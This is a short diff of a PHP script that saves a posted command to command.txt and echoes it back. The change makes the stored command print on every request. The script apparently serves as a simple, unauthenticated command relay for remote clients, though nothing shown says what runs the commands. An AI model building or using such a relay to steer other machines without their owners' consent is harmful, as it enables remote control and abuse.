@@ -1,6 +1,6 @@
 <?php
-if(isset($_GET["c"])) GetCommand();
 if(isset($_POST["c"])) SetCommand($_POST["c"]);
+GetCommand();
 
 function GetCommand(){
 	echo file_get_contents("command.txt");
